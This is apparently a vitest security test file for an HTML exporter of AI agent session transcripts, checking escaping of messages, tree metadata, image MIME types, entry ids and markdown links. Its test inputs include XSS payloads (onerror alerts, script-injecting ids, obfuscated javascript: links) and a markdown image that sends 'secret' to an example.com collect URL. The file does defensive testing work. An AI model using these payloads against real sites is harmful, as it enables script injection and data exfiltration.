// Tests exported HTML transcript escaping and template safety.
import { describe, expect, it } from "vitest";
import {
  now,
  renderTemplate,
  requireElement,
  type SessionData,
  type SessionEntry,
  templateCss,
} from "../../../../test/helpers/export-html-template.js";

function makeEntry(
  id: string,
  parentId: string | null,
  fields: Omit<SessionEntry, "id" | "parentId" | "timestamp">,
): SessionEntry {
  return { id, parentId, timestamp: now(), ...fields };
}

function makeMessage(id: string, parentId: string | null, value: unknown): SessionEntry {
  return makeEntry(id, parentId, { type: "message", message: value });
}

function makeAssistantTextEntry(id: string, parentId: string | null, text: string): SessionEntry {
  return makeMessage(id, parentId, { role: "assistant", content: [{ type: "text", text }] });
}

function makeSession(
  id: string,
  entries: SessionEntry[],
  leafId: string | null,
  options: Pick<SessionData, "warning" | "hasLeafControl"> = {},
): SessionData {
  return {
    header: { id, timestamp: now() },
    entries,
    leafId,
    systemPrompt: "",
    tools: [],
    ...options,
  };
}

function renderEntries(fields: Omit<SessionEntry, "id" | "parentId" | "timestamp">[]) {
  const entries = fields.map((entry, index) =>
    makeEntry(String(index + 1), index ? String(index) : null, entry),
  );
  return renderTemplate(makeSession("session", entries, entries.at(-1)?.id ?? null));
}

function message(role: string, content: unknown) {
  return { type: "message", message: { role, content } };
}

function toolCall(id: string, name: string, args: Record<string, unknown>) {
  return { type: "toolCall", id, name, arguments: args };
}

function toolResult(toolCallId: string, content: string) {
  return { type: "message", message: { role: "toolResult", toolCallId, content } };
}

function element(root: ParentNode, selector: string): HTMLElement {
  return requireElement(root.querySelector<HTMLElement>(selector), `missing ${selector}`);
}

function firstSelectorForDisplay(css: string, display: string, startAt: number): string | null {
  const displayRule = new RegExp(`([^{}]+)\\{[^{}]*\\bdisplay\\s*:\\s*${display}\\s*;`, "g");
  displayRule.lastIndex = startAt;
  const match = displayRule.exec(css);
  return match?.[1]?.split(",").at(-1)?.trim() ?? null;
}

it("lets the mobile hamburger display rule win the CSS cascade", () => {
  const baseSelector = "#hamburger.sidebar-menu-trigger";
  const mobileMediaIndex = templateCss.indexOf("@media (max-width: 900px)");
  const mobileSelector = firstSelectorForDisplay(templateCss, "inline-flex", mobileMediaIndex);

  expect(mobileMediaIndex).toBeGreaterThan(templateCss.indexOf(`${baseSelector} {`));
  expect(mobileSelector).toBe(baseSelector);
});

describe("export html security hardening", () => {
  it.each(["consult", "answer"])(
    "honors hidden input with %s selected while preserving raw export",
    async (leafId) => {
      function textEntry(id: string, parentId: string | null, content: string, role = "assistant") {
        return makeMessage(id, parentId, { role, content });
      }

      const session = makeSession(
        "session-hidden-input",
        [
          makeEntry("hidden-root", "hidden-root", {
            type: "custom_message",
            customType: "context",
            content: "Hidden root context",
            display: false,
          }),
          textEntry("speech", "hidden-root", "Explain the change. Context: Spoken style:", "user"),
          makeMessage("consult", "speech", {
            role: "user",
            content: "Synthetic consultation instructions",
            display: false,
            provenance: { kind: "internal_system", sourceTool: "openclaw_agent_consult" },
          }),
          textEntry("answer", "consult", "The change is ready."),
          textEntry("alternative", "speech", "An alternative reply."),
          textEntry("other-root", null, "Another conversation."),
        ],
        leafId,
      );

      const { document, downloadJson } = await renderTemplate(session);
      expect(document.querySelectorAll(".user-message")).toHaveLength(1);
      expect(document.getElementById("entry-speech")?.textContent).toContain(
        "Explain the change. Context: Spoken style:",
      );
      expect(document.getElementById("entry-consult")).toBeNull();
      expect(document.getElementById("entry-hidden-root")).toBeNull();
      const treeIds = () =>
        Array.from(document.querySelectorAll(".tree-node"), (node) => node.getAttribute("data-id"));
      const treePrefixes = () =>
        Array.from(document.querySelectorAll(".tree-prefix"), (node) => node.textContent);
      expect(treeIds()).toEqual(["speech", "answer", "alternative", "other-root"]);
      expect(treePrefixes()).toEqual(["", "├─ ", "└─ ", ""]);
      const selectFilter = (filter: string) =>
        element(document, `[data-filter="${filter}"]`).click();
      selectFilter("all");
      expect(treeIds()).toEqual([
        "hidden-root",
        "speech",
        "consult",
        "answer",
        "alternative",
        "other-root",
      ]);
      expect(treePrefixes()).toEqual(["", "   ", "   ├─ ", "   │     ", "   └─ ", ""]);
      expect(document.querySelector('[data-id="consult"]')?.textContent).toContain(
        "[hidden] user:",
      );
      element(document, '[data-id="consult"]').click();
      expect(document.getElementById("entry-answer")?.textContent).toContain(
        "The change is ready.",
      );
      expect(document.getElementById("entry-consult")).toBeNull();
      selectFilter("user-only");
      expect(treeIds()).not.toContain("consult");
      selectFilter("default");
      expect(treeIds()).toEqual(["speech", "answer", "alternative", "other-root"]);
      expect(treePrefixes()).toEqual(["", "├─ ", "└─ ", ""]);
      expect(document.getElementById("header-container")?.textContent).toContain(
        "2 user, 3 assistant, 1 custom",
      );
      const encoded = element(document, "#session-data");
      expect(JSON.parse(Buffer.from(encoded.textContent ?? "", "base64").toString("utf8"))).toEqual(
        session,
      );
      expect((await downloadJson()).split("\n").map((line) => JSON.parse(line))).toEqual([
        { type: "header", ...session.header },
        ...session.entries,
      ]);
    },
  );

  it("renders export warnings in the header without interpreting HTML", async () => {
    const warning = 'Backend <img src=x onerror="alert(1)"> transcript is incomplete';
    const session = makeSession(
      "session-warning",
      [
        makeMessage("1", null, {
          role: "user",
          content: "hello",
        }),
      ],
      "1",
      { warning },
    );

    const { document } = await renderTemplate(session);
    const warningNode = element(document, "#header-container .export-warning");

    expect(warningNode.textContent).toBe(warning);
    expect(warningNode.querySelector("img[onerror]")).toBeNull();
    expect(warningNode.innerHTML).toContain(
      'Backend &lt;img src=x onerror="alert(1)"&gt; transcript is incomplete',
    );
  });

  it("renders an explicitly selected empty branch without inactive messages", async () => {
    const session = makeSession(
      "session-empty",
      [
        makeMessage("inactive-tail", null, { role: "assistant", content: "inactive history" }),
        makeEntry("empty-leaf", "inactive-tail", {
          type: "leaf",
          targetId: null,
        }),
      ],
      null,
      { hasLeafControl: true },
    );

    const { document } = await renderTemplate(session);
    const messages = element(document, "#messages");
    expect(messages.textContent).not.toContain("inactive history");
  });

  it("escapes raw HTML from markdown blocks", async () => {
    const attack = "<img src=x onerror=alert(1)>";
    const { document } = await renderEntries([
      message("user", attack),
      { type: "branch_summary", summary: attack },
      { type: "custom_message", customType: "x", display: true, content: attack },
    ]);
    const messages = element(document, "#messages");
    expect(messages.querySelector("img[onerror]")).toBeNull();
    expect(messages.innerHTML).toContain("&lt;img src=x onerror=alert(1)&gt;");
  });

  it("renders Markdown and TypeScript highlighting without external assets", async () => {
    const { document } = await renderEntries([
      message("assistant", "**rendered**\n\n```typescript\nconst answer = true;\n```"),
    ]);
    const messages = element(document, "#messages");
    expect(messages.querySelector("strong")?.textContent).toBe("rendered");
    const code = element(messages, "pre code.hljs");
    expect(code.querySelector(".hljs-keyword")?.textContent).toBe("const");
    expect(code.textContent).toContain("answer = true");
  });

  it.each(["user", "assistant"] as const)(
    "renders tight-list inline formatting in %s transcript exports",
    async (role) => {
      const inline =
        "**Important**: read [the guide](https://example.test/guide) and use `config.json`.";
      const literal = "**literal** [not a link](https://example.test/literal)";
      const { document } = await renderEntries([
        message(
          role,
          `Paragraph control: ${inline}\n\n- ${inline}\n- Plain item.\n\n\`${literal}\``,
        ),
      ]);
      const entry = element(document, "#entry-1");
      const paragraph = element(entry, "p");
      expect(paragraph.querySelector("strong")?.textContent).toBe("Important");
      expect(paragraph.querySelector("a")?.getAttribute("href")).toBe("https://example.test/guide");
      expect(paragraph.querySelector("code")?.textContent).toBe("config.json");

      const list = element(entry, "ul");
      expect(list.querySelectorAll("li")).toHaveLength(2);
      const item = element(list, "li");
      expect(item.querySelector("strong")?.textContent).toBe("Important");
      const link = element(item, "a");
      expect(link.getAttribute("href")).toBe("https://example.test/guide");
      expect(link.textContent).toBe("the guide");
      expect(item.querySelector("code")?.textContent).toBe("config.json");
      expect(item.textContent?.trim()).toBe("Important: read the guide and use config.json.");

      const literalParagraph = requireElement(
        Array.from(entry.querySelectorAll("p")).find(
          (candidate) => candidate.querySelector("code")?.textContent === literal,
        ) ?? null,
        "literal code control missing",
      );
      expect(literalParagraph.textContent).toBe(literal);
      expect(literalParagraph.querySelector("a, strong")).toBeNull();
    },
  );

  it("escapes tree and header metadata fields", async () => {
    const attack = "<img src=x onerror=alert(9)>";
    const baseEntries: SessionEntry[] = [
      makeMessage("1", null, { role: "user", content: "ok" }),
      makeMessage("2", "1", {
        role: "assistant",
        model: attack,
        provider: "p",
        content: [{ type: "text", text: "assistant" }],
      }),
      makeMessage("3", "2", { role: "toolResult", toolName: attack }),
      makeEntry("4", "3", { type: "model_change", provider: "p", modelId: attack }),
      makeEntry("5", "4", { type: "thinking_level_change", thinkingLevel: attack }),
      makeEntry("6", "5", { type: attack }),
    ];

    const headerSession = makeSession("session-2", baseEntries, "6");

    const { document } = await renderTemplate(headerSession);
    const tree = element(document, "#tree-container");
    const header = element(document, "#header-container");
    expect(tree.querySelector("img[onerror]")).toBeNull();
    expect(header.querySelector("img[onerror]")).toBeNull();
    expect(tree.innerHTML).toContain("&lt;img src=x onerror=alert(9)&gt;");
    expect(header.innerHTML).toContain("&lt;img src=x onerror=alert(9)&gt;");

    const modelLeafSession = makeSession("session-2-model", baseEntries, "4");
    const modelLeaf = (await renderTemplate(modelLeafSession)).document;
    expect(modelLeaf.getElementById("tree-container")?.querySelector("img[onerror]")).toBeNull();
    expect(modelLeaf.getElementById("tree-container")?.innerHTML).toContain(
      "&lt;img src=x onerror=alert(9)&gt;",
    );

    const thinkingLeafSession = makeSession("session-2-thinking", baseEntries, "5");
    const thinkingLeaf = (await renderTemplate(thinkingLeafSession)).document;
    expect(thinkingLeaf.getElementById("tree-container")?.querySelector("img[onerror]")).toBeNull();
    expect(thinkingLeaf.getElementById("tree-container")?.innerHTML).toContain(
      "&lt;img src=x onerror=alert(9)&gt;",
    );
  });

  it("sanitizes image MIME types used in data URLs", async () => {
    const { document } = await renderEntries([
      message("user", [{ type: "image", data: "AAAA", mimeType: 'image/png" onerror="alert(7)' }]),
    ]);
    const img = element(document, "#messages .message-image");
    expect(img.getAttribute("onerror")).toBeNull();
    expect(img.getAttribute("src")).toBe("data:application/octet-stream;base64,AAAA");
  });

  it("flattens remote markdown images but keeps data-image markdown", async () => {
    const dataImage = "data:image/png;base64,AAAA";
    const { document } = await renderEntries([
      message("assistant", [
        {
          type: "text",
          text: `Leak:\n\n![exfil](https://example.com/collect?data=secret)\n\n![pixel](${dataImage})`,
        },
      ]),
    ]);
    const messages = element(document, "#messages");
    expect(messages.querySelector('img[src^="https://"]')).toBeNull();
    expect(messages.textContent).toContain("exfil");
    element(messages, `img[src="${dataImage}"]`);
  });

  it("flattens unsafe markdown links while preserving safe links", async () => {
    const { document } = await renderEntries([
      message(
        "user",
        [
          "[script](javascript:alert(1))",
          "[encoded](java&#x73;cript&colon;alert(2))",
          "[split](java&Tab;script&colon;alert(3))",
          "[zero-width](java&#x200b;script&colon;alert(4))",
          "[surrogate](java&#xd800;script&colon;alert(5))",
          '[safe](https://example.com/report "report")',
        ].join("\n"),
      ),
      message("assistant", [
        {
          type: "text",
          text: "[data](data:text/html;base64,PGgxPnBvYzwvaDE+) [mail](mailto:test@example.com)",
        },
      ]),
      { type: "branch_summary", summary: "[relative](./notes.md)" },
      { type: "custom_message", customType: "x", display: true, content: "[hash](#entry-1)" },
    ]);
    const messages = element(document, "#messages");
    const hrefs = Array.from(messages.querySelectorAll("a"), (link) => link.getAttribute("href"));

    expect(hrefs).toEqual([
      "https://example.com/report",
      "mailto:test@example.com",
      "./notes.md",
      "#entry-1",
    ]);
    expect(messages.querySelector("a")?.getAttribute("title")).toBe("report");
    expect(messages.textContent).toContain("script");
    expect(messages.textContent).toContain("encoded");
    expect(messages.textContent).toContain("split");
    expect(messages.textContent).toContain("zero-width");
    expect(messages.textContent).toContain("surrogate");
    expect(messages.textContent).toContain("data");
    expect(hrefs.some((href) => href?.startsWith("javascript:") || href?.startsWith("data:"))).toBe(
      false,
    );
  });

  it("escapes entry.id in element id and data-entry-id attributes", async () => {
    const xssId = `"><script>alert(1)</script><div data-x="`;
    const session = makeSession(
      "session-xss-id",
      [
        makeMessage(xssId, null, { role: "user", content: "hello" }),
        makeAssistantTextEntry("safe-child", xssId, "world"),
      ],
      "safe-child",
    );

    const { document } = await renderTemplate(session);
    const messages = element(document, "#messages");

    expect(messages.querySelectorAll("script").length).toBe(0);

    expect(messages.querySelector("[onmouseover]")).toBeNull();

    const copyBtn = element(messages, ".copy-link-btn");
    expect(copyBtn.hasAttribute("data-entry-id")).toBe(true);
    expect(copyBtn.hasAttribute("data-x")).toBe(false);
    expect(copyBtn.dataset.entryId).toBe(xssId);

    const userMsg = element(messages, ".user-message");
    expect(userMsg.getAttribute("data-x")).toBeNull();
    expect(document.getElementById(`entry-${xssId}`)).toBe(userMsg);
    const elementId = userMsg.getAttribute("id") ?? "";
    expect(elementId.startsWith("entry-")).toBe(true);
  });

  it("truncates tree node text without splitting surrogate pairs", async () => {
    const emoji = "😀";
    const prefix = "x".repeat(99);
    const { document } = await renderEntries([message("user", `${prefix}${emoji}tail`)]);
    const treeText =
      Array.from(document.querySelectorAll(".tree-content")).find((node) =>
        node.textContent?.includes("user:"),
      )?.textContent ?? "";

    expect(treeText).toContain(`user: ${prefix}...`);
    expect(treeText).not.toContain(emoji);
    expect(treeText).not.toMatch(
      /[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/u,
    );
  });

  it("escapes markdown data-image attributes", async () => {
    const dataImage = "data:image/png;base64,AAAA";
    const { document } = await renderEntries([
      message("assistant", [{ type: "text", text: `![x" onerror="alert(1)](${dataImage})` }]),
    ]);
    const img = element(document, "#messages img");
    expect(img.getAttribute("onerror")).toBeNull();
    expect(img.getAttribute("alt")).toBe('x" onerror="alert(1)');
    expect(img.getAttribute("src")).toBe(dataImage);
  });

  it("does not crash when assistant message has non-array content", async () => {
    for (const content of [null, undefined, "plain string", 42]) {
      const { document } = await renderEntries([
        message("user", "hello"),
        message("assistant", content),
      ]);
      if (typeof content === "string") {
        expect(document.querySelector(".assistant-message")?.textContent).toContain(content);
      }
    }
  });

  it("renders string tool-result content", async () => {
    const { document } = await renderEntries([
      message("user", "run a command"),
      message("assistant", [toolCall("call-1", "bash", { command: "echo legacy" })]),
      toolResult("call-1", "legacy output"),
    ]);
    expect(document.querySelector(".tool-output")?.textContent).toContain("legacy output");
  });

  it("does not crash when user message has non-array non-string content", async () => {
    for (const content of [null, undefined, 42]) {
      await expect(renderEntries([message("user", content)])).resolves.toBeDefined();
    }
  });
});

it("truncates tool previews without splitting emoji", async () => {
  const bashPrefix = "a".repeat(49);
  const genericPrefix = "b".repeat(29);
  const bashExecutionPrefix = "c".repeat(99);
  const { document } = await renderEntries([
    message("user", "run tools"),
    message("assistant", [
      toolCall("call-bash", "bash", { command: `${bashPrefix}😀tail` }),
      toolCall("call-custom", "custom", { value: `${genericPrefix}😀tail` }),
    ]),
    toolResult("call-bash", "bash output"),
    toolResult("call-custom", "custom output"),
    {
      type: "message",
      message: { role: "bashExecution", command: `${bashExecutionPrefix}😀tail` },
    },
  ]);
  const previews = ["3", "4", "5"].map(
    (id) => element(document, `.tree-node[data-id="${id}"] .tree-content`).textContent,
  );

  expect(previews).toEqual([
    `[bash: ${bashPrefix}...]`,
    `[custom: {"value":"${genericPrefix}...]`,
    `[bash]: ${bashExecutionPrefix}...`,
  ]);
});
